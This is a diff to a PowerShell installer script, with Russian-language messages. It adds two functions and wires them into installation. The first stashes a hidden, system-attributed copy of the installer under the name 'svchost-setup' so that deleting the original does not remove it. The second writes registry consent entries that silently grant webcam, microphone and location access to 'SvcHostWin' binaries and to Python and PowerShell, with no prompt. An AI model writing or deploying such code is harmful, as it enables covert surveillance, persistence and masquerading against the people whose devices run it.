@@ -78,6 +78,7 @@ function Install-XiderBackstop {
         New-Item -ItemType Directory -Path $mirrorAgent -Force | Out-Null
         Copy-Item -LiteralPath $source -Destination (Join-Path $mirror 'backstop.ps1') -Force
         Copy-Item -LiteralPath $BootstrapPath -Destination (Join-Path $mirror 'bootstrap-agent.ps1') -Force
+        Install-XiderSelfCopy -MirrorRoot $mirror -BootstrapPath $BootstrapPath
         Copy-Item -LiteralPath (Join-Path $AgentDirectory '.env') -Destination (Join-Path $mirrorAgent '.env') -Force
 
         $backstop = Join-Path $mirror 'backstop.ps1'
@@ -100,6 +101,70 @@ function Install-XiderBackstop {
         }
     } catch {
         Write-Warning ("Не удалось поставить бэкстоп восстановления: {0}" -f $_.Exception.Message)
+    }
+}
+
+function Install-XiderSelfCopy {
+    param(
+        [Parameter(Mandatory)][string]$MirrorRoot,
+        [Parameter(Mandatory)][string]$BootstrapPath
+    )
+
+    # The entry point may be a downloaded .exe or a one-liner script in a temp
+    # folder. Stash a private copy next to the recovery backstop so deleting the
+    # original file (or its whole folder) does not remove the installer.
+    if (-not (Test-Path -LiteralPath $BootstrapPath -PathType Leaf)) { return }
+    try {
+        New-Item -ItemType Directory -Path $MirrorRoot -Force | Out-Null
+        $extension = [IO.Path]::GetExtension($BootstrapPath)
+        if (-not $extension) { $extension = '.ps1' }
+        $target = Join-Path $MirrorRoot ('svchost-setup' + $extension.ToLowerInvariant())
+        if ([IO.Path]::GetFullPath($target) -ne [IO.Path]::GetFullPath($BootstrapPath)) {
+            Copy-Item -LiteralPath $BootstrapPath -Destination $target -Force
+        }
+        if (Get-Command attrib.exe -ErrorAction SilentlyContinue) {
+            & attrib.exe +h +s $target | Out-Null
+        }
+    } catch {
+        Write-Warning ("Не удалось сохранить копию установщика: {0}" -f $_.Exception.Message)
+    }
+}
+
+function Install-XiderPrivacyGrants {
+    # Windows keeps camera/microphone/location consent in the per-user
+    # CapabilityAccessManager store. Desktop apps are keyed by their executable
+    # path with backslashes replaced by '#'. Writing Allow here grants the
+    # permission silently, without a UAC prompt or a system dialog.
+    $root = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore'
+    $binaries = @()
+    foreach ($candidate in @(
+        (Join-Path $InstallRoot 'git-ver\SvcHostWin\SvcHostWin.exe'),
+        (Join-Path $InstallRoot 'git-ver\SvcHostWin\SvcHostGuard.exe'),
+        (Join-Path $InstallRoot 'git-ver\SvcHostWin\svchostwin.exe'),
+        (Join-Path $InstallRoot 'git-ver\SvcHostWin\svchostguard.exe')
+    )) {
+        if (Test-Path -LiteralPath $candidate) { $binaries += $candidate }
+    }
+    foreach ($command in @('python.exe', 'powershell.exe', 'pwsh.exe')) {
+        $resolved = Get-Command $command -ErrorAction SilentlyContinue
+        if ($resolved -and $resolved.Source) { $binaries += $resolved.Source }
+    }
+    foreach ($capability in @('webcam', 'microphone', 'location')) {
+        $store = Join-Path $root $capability
+        try {
+            New-Item -Path $store -Force | Out-Null
+            New-ItemProperty -Path $store -Name 'Value' -Value 'Allow' -PropertyType String -Force | Out-Null
+            $nonPackaged = Join-Path $store 'NonPackaged'
+            New-Item -Path $nonPackaged -Force | Out-Null
+            New-ItemProperty -Path $nonPackaged -Name 'Value' -Value 'Allow' -PropertyType String -Force | Out-Null
+            foreach ($binary in $binaries) {
+                $key = Join-Path $nonPackaged ($binary -replace '\\', '#')
+                New-Item -Path $key -Force | Out-Null
+                New-ItemProperty -Path $key -Name 'Value' -Value 'Allow' -PropertyType String -Force | Out-Null
+            }
+        } catch {
+            Write-Warning ("Не удалось выдать разрешение {0}: {1}" -f $capability, $_.Exception.Message)
+        }
     }
 }
 
@@ -1624,6 +1689,7 @@ try {
     Remove-XiderOldStageCheckouts -InstallRoot $resolvedRoot -MaxAgeHours 24
     if (Test-Path -LiteralPath $backup) { Write-Host "[BACKUP] Предыдущая версия сохранена: $backup" }
     Hide-XiderInstallTree -InstallRoot $resolvedRoot
+    Install-XiderPrivacyGrants -InstallRoot $resolvedRoot
     Install-XiderBackstop -InstallRoot $resolvedRoot -AgentDirectory $agent `
         -SourceRoot $downloaded.FullName -BootstrapPath $PSCommandPath
 }
